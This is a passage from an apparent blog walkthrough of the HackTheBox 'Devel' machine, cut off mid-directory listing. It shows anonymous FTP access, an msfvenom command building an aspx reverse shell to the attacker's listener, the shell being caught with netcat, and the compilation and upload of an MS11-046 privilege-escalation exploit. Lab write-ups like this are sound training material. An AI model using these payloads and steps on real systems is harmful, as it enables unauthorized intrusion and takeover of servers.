<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="author" content="Marco Meli">
  <meta name="description" content="Devel | Initial Nmap root@Kali:~# nmap -p- -sV -sC 10.10.10.5 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 18:44 GMT Nmap scan report for...">

  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">

  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.3/jquery.min.js"></script>
  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>

  
 


<meta name="keywords" content="HackTheBox">


  <title>Devel</title>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-156989597-1', 'auto');
  ga('send', 'pageview');

</script>
  
</head>

<body class="home blog">
  <div>
    <header class="site-header">
      <nav class="navbar navbar-default" role="navigation">
        <div class="container">
          <div class="row">
            <div class="site-navigation-inner col-sm-12">
              <div class="navbar-header">
                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                  <span class="sr-only">Toggle navigation</span>
                  <span class="icon-bar"></span>
                  <span class="icon-bar"></span>
                  <span class="icon-bar"></span>
                </button>
              </div>
              <div class="collapse navbar-collapse navbar-ex1-collapse">
              <ul id="menu-all-pages" class="nav navbar-nav">
                <li class="menu-item"><a href="https://sittingducks.io" >home
<i class="fa  fa-lg"></i></a></li>
              </ul>
              </div>
              <div class="social">   
                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
<i class="fa fa-linkedin fa-lg"></i></a>
              </div>
            </div>
          </div>
        </div>
      </nav><!-- .site-navigation -->

      <div class="container">
      <div id="logo">
        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="images/logo.png" class="attachment-full size-full" alt="logo">          </a>
        </span><!-- end of .site-name -->
      </div><!-- end of #logo -->
        <div class="tagline">
                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (12)</a> &#124; 
                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
                <a href="https://sittingducks.io/archives.html" >Archives (14)</a>
        </div>
    </div>

  </header><!-- #masthead -->
  </div>
    <div id="content" class="site-content">
      <div class="container main-content-area">
        <div class="row">
          <div class="main-content-inner col-sm-12 col-md-12">
            <div id="primary" class="content-area">
              <div id="main" class="site-main" role="main">
                <div class="article-container">
<article>
  <div class="blog-item-wrap">
    <div class="post-inner-content">
      <header class="entry-header page-header">
        <span class="cat-item"><time datetime="2020-02-23 22:06:00+00:00">Sun 23 February 2020</time></span>
        <h1 class="entry-title"><a href="https://sittingducks.io/Devel.html">Devel</a></h1>
      </header><!-- .entry-header -->
      <div class="fb-like" data-href="https://sittingducks.io/Devel.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
      <div class="entry-content">
        <h1>Initial Nmap</h1>
<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="mf">10.10.10.5</span><span class="w"></span>
<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">23</span><span class="w"> </span><span class="mi">18</span><span class="err">:</span><span class="mi">44</span><span class="w"> </span><span class="n">GMT</span><span class="w"></span>
<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">10.10.10.5</span><span class="w"></span>
<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.065</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span>
<span class="ow">Not</span><span class="w"> </span><span class="nl">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65533</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">ports</span><span class="w"></span>
<span class="n">PORT</span><span class="w">   </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="n">VERSION</span><span class="w"></span>
<span class="mi">21</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ftp</span><span class="w">     </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">ftpd</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="n">ftp</span><span class="o">-</span><span class="nl">anon</span><span class="p">:</span><span class="w"> </span><span class="n">Anonymous</span><span class="w"> </span><span class="n">FTP</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">allowed</span><span class="w"> </span><span class="p">(</span><span class="n">FTP</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="mi">230</span><span class="p">)</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="mi">03</span><span class="o">-</span><span class="mi">18</span><span class="o">-</span><span class="mi">17</span><span class="w">  </span><span class="mi">01</span><span class="err">:</span><span class="mi">06</span><span class="n">AM</span><span class="w">       </span><span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span><span class="w">          </span><span class="n">aspnet_client</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="mi">03</span><span class="o">-</span><span class="mi">17</span><span class="o">-</span><span class="mi">17</span><span class="w">  </span><span class="mi">04</span><span class="err">:</span><span class="mi">37</span><span class="n">PM</span><span class="w">                  </span><span class="mi">689</span><span class="w"> </span><span class="n">iisstart</span><span class="p">.</span><span class="n">htm</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="mi">02</span><span class="o">-</span><span class="mi">27</span><span class="o">-</span><span class="mi">20</span><span class="w">  </span><span class="mi">04</span><span class="err">:</span><span class="mi">03</span><span class="n">AM</span><span class="w">       </span><span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span><span class="w">          </span><span class="n">thirty6</span><span class="w"></span>
<span class="o">|</span><span class="n">_03</span><span class="o">-</span><span class="mi">17</span><span class="o">-</span><span class="mi">17</span><span class="w">  </span><span class="mi">04</span><span class="err">:</span><span class="mi">37</span><span class="n">PM</span><span class="w">               </span><span class="mi">184946</span><span class="w"> </span><span class="n">welcome</span><span class="p">.</span><span class="n">png</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="n">ftp</span><span class="o">-</span><span class="nl">syst</span><span class="p">:</span><span class="w"> </span>
<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="nl">SYST</span><span class="p">:</span><span class="w"> </span><span class="n">Windows_NT</span><span class="w"></span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">IIS</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mf">7.5</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="nl">methods</span><span class="p">:</span><span class="w"> </span>
<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">Potentially</span><span class="w"> </span><span class="n">risky</span><span class="w"> </span><span class="nl">methods</span><span class="p">:</span><span class="w"> </span><span class="n">TRACE</span><span class="w"></span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="nl">header</span><span class="p">:</span><span class="w"> </span><span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="o">/</span><span class="mf">7.5</span><span class="w"></span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="nl">title</span><span class="p">:</span><span class="w"> </span><span class="n">IIS7</span><span class="w"></span>
<span class="n">Service</span><span class="w"> </span><span class="nl">Info</span><span class="p">:</span><span class="w"> </span><span class="nl">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="p">;</span><span class="w"> </span><span class="nl">CPE</span><span class="p">:</span><span class="w"> </span><span class="nl">cpe</span><span class="p">:</span><span class="o">/</span><span class="nl">o</span><span class="p">:</span><span class="nl">microsoft</span><span class="p">:</span><span class="n">windows</span><span class="w"></span>

<span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">151.47</span><span class="w"> </span><span class="n">seconds</span><span class="w"></span>
</pre></div>


<p>nmap reveals that there is an FTP server running on port 21 and anonymous authentication is allowed. There is also an IIS server (version 7.5) on port 80 which most probably works in combination with the FTP server. We can easily verify that.</p>
<p>Navigating to the webserver we get this:</p>
<p><img alt="" src="../images/develIS.png"></p>
<div class="highlight"><pre><span></span><span class="err">root@Kali:~# ftp 10.10.10.5</span>
<span class="err">Connected to 10.10.10.5.</span>
<span class="err">220 Microsoft FTP Service</span>
<span class="err">Name (10.10.10.5:user): anonymous</span>
<span class="err">331 Anonymous access allowed, send identity (e-mail name) as password.</span>
<span class="c">Password:</span>
<span class="err">230 User logged in.</span>
<span class="err">Remote system type is Windows_NT.</span>
<span class="err">ftp&gt;</span>
</pre></div>


<p>As shown above I used the anonymous user and a random password and I authenticated successfully.</p>
<p>Now I create a simple html file in my kali box and I add the text hello World! inside. Then I upload this file into the ftp server:</p>
<div class="highlight"><pre><span></span><span class="err">ftp&gt; put test.html</span>
<span class="c">local: test.html remote: test.html</span>
<span class="err">200 PORT command successful.</span>
<span class="err">125 Data connection already open; Transfer starting.</span>
<span class="err">226 Transfer complete.</span>
<span class="err">14 bytes sent in 0.00 secs (976.5625 kB/s)</span>
<span class="err">ftp&gt; dir</span>
<span class="err">200 PORT command successful.</span>
<span class="err">125 Data connection already open; Transfer starting.</span>
<span class="err">03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client</span>
<span class="err">03-17-17  04:37PM                  689 iisstart.htm</span>
<span class="err">02-27-20  06:30PM                   14 test.html</span>
<span class="err">03-17-17  04:37PM               184946 welcome.png</span>
<span class="err">226 Transfer complete.</span>
<span class="err">ftp&gt; </span>
</pre></div>


<p>then I browse to that address:</p>
<p><img alt="" src="../images/develHW.png"></p>
<p>This confirms that we can upload stuff into the ftp server and we can execute it using the webserver since they work in combination.</p>
<p>Using the same concept we can upload a webshell. IIS 7.5 supports aspx so we can create an aspx webshell with msfvenom:</p>
<div class="highlight"><pre><span></span><span class="err">root@Kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.17 LPORT=443 -f aspx &gt; reverse.aspx</span>
<span class="err">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span>
<span class="err">[-] No arch selected, selecting arch: x86 from the payload</span>
<span class="err">No encoder or badchars specified, outputting raw payload</span>
<span class="err">Payload size: 324 bytes</span>
<span class="err">Final size of aspx file: 2699 bytes</span>
<span class="err">root@Kali:~# ll</span>
<span class="err">total 4</span>
<span class="err">-rw-rw-r-- 1 root root 2699 Feb 24 08:47 reverse.aspx</span>
</pre></div>


<p>then I upload it to the ftp server:</p>
<div class="highlight"><pre><span></span><span class="err">ftp&gt; put reverse.aspx</span>
<span class="c">local: reverse.aspx remote: reverse.aspx</span>
<span class="err">200 PORT command successful.</span>
<span class="err">125 Data connection already open; Transfer starting.</span>
<span class="err">226 Transfer complete.</span>
<span class="err">2734 bytes sent in 0.00 secs (36.7232 MB/s)</span>
<span class="err">ftp&gt; </span>
</pre></div>


<p>After setting up a netcat listener on port 443 and hitting the address http://10.10./10.5/reverse.aspx I get a shell back as the iis user web:</p>
<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lnvp</span><span class="w"> </span><span class="mi">443</span><span class="w"></span>
<span class="n">listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="mi">443</span><span class="w"> </span><span class="p">...</span><span class="w"></span>
<span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.14.17</span><span class="o">]</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.10.5</span><span class="o">]</span><span class="w"> </span><span class="mi">49166</span><span class="w"></span>
<span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="o">[</span><span class="n">Version 6.1.7600</span><span class="o">]</span><span class="w"></span>
<span class="n">Copyright</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2009</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Corporation</span><span class="p">.</span><span class="w">  </span><span class="ow">All</span><span class="w"> </span><span class="n">rights</span><span class="w"> </span><span class="n">reserved</span><span class="p">.</span><span class="w"></span>

<span class="nl">c</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">system32</span><span class="err">\</span><span class="n">inetsrv</span><span class="o">&gt;</span><span class="n">whoami</span><span class="w"></span>
<span class="n">whoami</span><span class="w"></span>
<span class="n">iis</span><span class="w"> </span><span class="n">apppool</span><span class="err">\</span><span class="n">web</span><span class="w"></span>

<span class="nl">c</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">system32</span><span class="err">\</span><span class="n">inetsrv</span><span class="o">&gt;</span><span class="w"></span>
</pre></div>


<p>having a look there seem to a user called babis further to Administrator. If I try to access both users directories I get access denied. </p>
<div class="highlight"><pre><span></span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="o">&gt;</span><span class="n">dir</span>
<span class="n">dir</span>
 <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="k">C</span> <span class="n">has</span> <span class="k">no</span> <span class="n">label</span><span class="p">.</span>
 <span class="n">Volume</span> <span class="nb">Serial</span> <span class="nb">Number</span> <span class="k">is</span> <span class="mi">8620</span><span class="o">-</span><span class="mi">71</span><span class="n">F1</span>

 <span class="n">Directory</span> <span class="k">of</span> <span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span>

<span class="mi">18</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2017</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">16</span>     <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="p">.</span>
<span class="mi">18</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2017</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">16</span>     <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="p">..</span>
<span class="mi">18</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2017</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">16</span>     <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Administrator</span>
<span class="mi">17</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2017</span>  <span class="mi">04</span><span class="p">:</span><span class="mi">17</span>     <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">babis</span>
<span class="mi">18</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2017</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">06</span>     <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Classic</span> <span class="p">.</span><span class="n">NET</span> <span class="n">AppPool</span>
<span class="mi">14</span><span class="o">/</span><span class="mi">07</span><span class="o">/</span><span class="mi">2009</span>  <span class="mi">09</span><span class="p">:</span><span class="mi">20</span>     <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="k">Public</span>
               <span class="mi">0</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>              <span class="mi">0</span> <span class="n">bytes</span>
               <span class="mi">6</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="mi">24</span><span class="p">.</span><span class="mi">604</span><span class="p">.</span><span class="mi">782</span><span class="p">.</span><span class="mi">592</span> <span class="n">bytes</span> <span class="k">free</span>

<span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="o">&gt;</span><span class="n">cd</span> <span class="n">babis</span>
<span class="n">cd</span> <span class="n">babis</span>
<span class="k">Access</span> <span class="k">is</span> <span class="n">denied</span><span class="p">.</span>

<span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="o">&gt;</span>
</pre></div>


<p>Let's get the systeminfo:</p>
<div class="highlight"><pre><span></span><span class="nt">c</span><span class="o">:</span><span class="err">\</span><span class="nt">Users</span><span class="o">&gt;</span><span class="nt">systeminfo</span>
<span class="nt">systeminfo</span>

<span class="nt">Host</span> <span class="nt">Name</span><span class="o">:</span>                 <span class="nt">DEVEL</span>
<span class="nt">OS</span> <span class="nt">Name</span><span class="o">:</span>                   <span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="nt">7</span> <span class="nt">Enterprise</span> 
<span class="nt">OS</span> <span class="nt">Version</span><span class="o">:</span>                <span class="nt">6</span><span class="p">.</span><span class="nc">1</span><span class="p">.</span><span class="nc">7600</span> <span class="nt">N</span><span class="o">/</span><span class="nt">A</span> <span class="nt">Build</span> <span class="nt">7600</span>
<span class="nt">OS</span> <span class="nt">Manufacturer</span><span class="o">:</span>           <span class="nt">Microsoft</span> <span class="nt">Corporation</span>
<span class="nt">OS</span> <span class="nt">Configuration</span><span class="o">:</span>          <span class="nt">Standalone</span> <span class="nt">Workstation</span>
<span class="nt">OS</span> <span class="nt">Build</span> <span class="nt">Type</span><span class="o">:</span>             <span class="nt">Multiprocessor</span> <span class="nt">Free</span>
<span class="nt">Registered</span> <span class="nt">Owner</span><span class="o">:</span>          <span class="nt">babis</span>
<span class="nt">Registered</span> <span class="nt">Organization</span><span class="o">:</span>   
<span class="nt">Product</span> <span class="nt">ID</span><span class="o">:</span>                <span class="nt">55041-051-0948536-86302</span>
<span class="nt">Original</span> <span class="nt">Install</span> <span class="nt">Date</span><span class="o">:</span>     <span class="nt">17</span><span class="o">/</span><span class="nt">3</span><span class="o">/</span><span class="nt">2017</span><span class="o">,</span> <span class="nt">4</span><span class="p">:</span><span class="nd">17</span><span class="p">:</span><span class="nd">31</span> 
<span class="nt">System</span> <span class="nt">Boot</span> <span class="nt">Time</span><span class="o">:</span>          <span class="nt">27</span><span class="o">/</span><span class="nt">2</span><span class="o">/</span><span class="nt">2020</span><span class="o">,</span> <span class="nt">6</span><span class="p">:</span><span class="nd">06</span><span class="p">:</span><span class="nd">31</span> 
<span class="nt">System</span> <span class="nt">Manufacturer</span><span class="o">:</span>       <span class="nt">VMware</span><span class="o">,</span> <span class="nt">Inc</span><span class="o">.</span>
<span class="nt">System</span> <span class="nt">Model</span><span class="o">:</span>              <span class="nt">VMware</span> <span class="nt">Virtual</span> <span class="nt">Platform</span>
<span class="nt">System</span> <span class="nt">Type</span><span class="o">:</span>               <span class="nt">X86-based</span> <span class="nt">PC</span>
<span class="nt">Processor</span><span class="o">(</span><span class="nt">s</span><span class="o">):</span>              <span class="nt">1</span> <span class="nt">Processor</span><span class="o">(</span><span class="nt">s</span><span class="o">)</span> <span class="nt">Installed</span><span class="o">.</span>
                           <span class="cp">[</span><span class="mi">01</span><span class="cp">]</span><span class="o">:</span> <span class="nt">x64</span> <span class="nt">Family</span> <span class="nt">23</span> <span class="nt">Model</span> <span class="nt">1</span> <span class="nt">Stepping</span> <span class="nt">2</span> <span class="nt">AuthenticAMD</span> <span class="o">~</span><span class="nt">2000</span> <span class="nt">Mhz</span>
<span class="nt">BIOS</span> <span class="nt">Version</span><span class="o">:</span>              <span class="nt">Phoenix</span> <span class="nt">Technologies</span> <span class="nt">LTD</span> <span class="nt">6</span><span class="p">.</span><span class="nc">00</span><span class="o">,</span> <span class="nt">12</span><span class="o">/</span><span class="nt">12</span><span class="o">/</span><span class="nt">2018</span>
<span class="nt">Windows</span> <span class="nt">Directory</span><span class="o">:</span>         <span class="nt">C</span><span class="o">:</span><span class="err">\</span><span class="nt">Windows</span>
<span class="nt">System</span> <span class="nt">Directory</span><span class="o">:</span>          <span class="nt">C</span><span class="o">:</span><span class="err">\</span><span class="nt">Windows</span><span class="err">\</span><span class="nt">system32</span>
<span class="nt">Boot</span> <span class="nt">Device</span><span class="o">:</span>               <span class="err">\</span><span class="nt">Device</span><span class="err">\</span><span class="nt">HarddiskVolume1</span>
<span class="nt">System</span> <span class="nt">Locale</span><span class="o">:</span>             <span class="nt">el</span><span class="o">;</span><span class="nt">Greek</span>
<span class="nt">Input</span> <span class="nt">Locale</span><span class="o">:</span>              <span class="nt">en-us</span><span class="o">;</span><span class="nt">English</span> <span class="o">(</span><span class="nt">United</span> <span class="nt">States</span><span class="o">)</span>
<span class="nt">Time</span> <span class="nt">Zone</span><span class="o">:</span>                 <span class="o">(</span><span class="nt">UTC</span><span class="o">+</span><span class="nt">02</span><span class="p">:</span><span class="nd">00</span><span class="o">)</span> <span class="nt">Athens</span><span class="o">,</span> <span class="nt">Bucharest</span><span class="o">,</span> <span class="nt">Istanbul</span>
<span class="nt">Total</span> <span class="nt">Physical</span> <span class="nt">Memory</span><span class="o">:</span>     <span class="nt">1</span><span class="p">.</span><span class="nc">023</span> <span class="nt">MB</span>
<span class="nt">Available</span> <span class="nt">Physical</span> <span class="nt">Memory</span><span class="o">:</span> <span class="nt">668</span> <span class="nt">MB</span>
<span class="nt">Virtual</span> <span class="nt">Memory</span><span class="o">:</span> <span class="nt">Max</span> <span class="nt">Size</span><span class="o">:</span>  <span class="nt">2</span><span class="p">.</span><span class="nc">047</span> <span class="nt">MB</span>
<span class="nt">Virtual</span> <span class="nt">Memory</span><span class="o">:</span> <span class="nt">Available</span><span class="o">:</span> <span class="nt">1</span><span class="p">.</span><span class="nc">505</span> <span class="nt">MB</span>
<span class="nt">Virtual</span> <span class="nt">Memory</span><span class="o">:</span> <span class="nt">In</span> <span class="nt">Use</span><span class="o">:</span>    <span class="nt">542</span> <span class="nt">MB</span>
<span class="nt">Page</span> <span class="nt">File</span> <span class="nt">Location</span><span class="o">(</span><span class="nt">s</span><span class="o">):</span>     <span class="nt">C</span><span class="o">:</span><span class="err">\</span><span class="nt">pagefile</span><span class="p">.</span><span class="nc">sys</span>
<span class="nt">Domain</span><span class="o">:</span>                    <span class="nt">HTB</span>
<span class="nt">Logon</span> <span class="nt">Server</span><span class="o">:</span>              <span class="nt">N</span><span class="o">/</span><span class="nt">A</span>
<span class="nt">Hotfix</span><span class="o">(</span><span class="nt">s</span><span class="o">):</span>                 <span class="nt">N</span><span class="o">/</span><span class="nt">A</span>
<span class="nt">Network</span> <span class="nt">Card</span><span class="o">(</span><span class="nt">s</span><span class="o">):</span>           <span class="nt">1</span> <span class="nt">NIC</span><span class="o">(</span><span class="nt">s</span><span class="o">)</span> <span class="nt">Installed</span><span class="o">.</span>
                           <span class="cp">[</span><span class="mi">01</span><span class="cp">]</span><span class="o">:</span> <span class="nt">Intel</span><span class="o">(</span><span class="nt">R</span><span class="o">)</span> <span class="nt">PRO</span><span class="o">/</span><span class="nt">1000</span> <span class="nt">MT</span> <span class="nt">Network</span> <span class="nt">Connection</span>
                                 <span class="nt">Connection</span> <span class="nt">Name</span><span class="o">:</span> <span class="nt">Local</span> <span class="nt">Area</span> <span class="nt">Connection</span>
                                 <span class="nt">DHCP</span> <span class="nt">Enabled</span><span class="o">:</span>    <span class="nt">No</span>
                                 <span class="nt">IP</span> <span class="nt">address</span><span class="o">(</span><span class="nt">es</span><span class="o">)</span>
                                 <span class="cp">[</span><span class="mi">01</span><span class="cp">]</span><span class="o">:</span> <span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">5</span>
</pre></div>


<p>From the systeminfo output I get that Windows version is 6.1.7600 N/A Build 7600. If I google that string the first result I get is the following privesc exploit:</p>
<p>https://www.exploit-db.com/exploits/40564</p>
<p>I download it and compile the <code>C</code> file:</p>
<div class="highlight"><pre><span></span><span class="err">root@Kali:/home/user/Documents/htb/boxes/devel# i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32</span>
<span class="err">root@Kali:/home/user/Documents/htb/boxes/devel# ll</span>
<span class="err">total 344</span>
<span class="err">-rw-rw-r-- 1 root root  31866 Feb 24 12:22 40564.c</span>
<span class="err">-rwxrwxr-x 1 root root 299312 Feb 24 13:08 MS11-046.exe</span>
</pre></div>


<p>Then I upload it with ftp:</p>
<div class="highlight"><pre><span></span><span class="err">ftp&gt; put MS11-046.exe                                                                          </span>
<span class="c">local: MS11-046.exe remote: MS11-046.exe   </span>
<span class="err">200 PORT command successful.                                                                                                                                                                  </span>
<span class="err">125 Data connection already open; Transfer starting.                                           </span>
<span class="err">226 Transfer complete.                                                                                                                                                                        </span>
<span class="err">299312 bytes sent in 0.36 secs (807.2827 kB/s)</span>
</pre></div>


<p>The defaule IIS working directory in Windows is c:\inetpub\wwwroot so I move there: </p>
<div class="highlight"><pre><span></span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">inetpub</span><span class="err">\</span><span class="n">wwwroot</span><span class="o">&gt;</span><span class="n">dir</span>
<span class="n">dir</span>
 <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="k">C</span> <span class="n">has</span> <span class="k">no</span> <span class="n">label</span><span class="p">.</span>
 <span class="n">Volume</span> <span class="nb">Serial</span> <span class="nb">Number</span> <span class="k">is</span> <span class="mi">8620</span><span class="o">-</span><span class="mi">71</span><span class="n">F1</span>

 <span class="n">Directory</span> <span class="k">of</span> <span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">inetpub</span><span class="err">\</span><span class="n">wwwroot</span>

<span class="mi">27</span><span class="o">/</span><span class="mi">02</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">07</span><span class="p">:</span><span class="mi">40</span>     <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="p">.</span>
<span class="mi">27</span><span class="o">/</span><span class="mi">02</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">07</span><span class="p">:</span><span class="mi">40</span>     <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="p">..</span>
<span class="mi">18</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2017</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">06</span>     <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">aspnet_client</span>
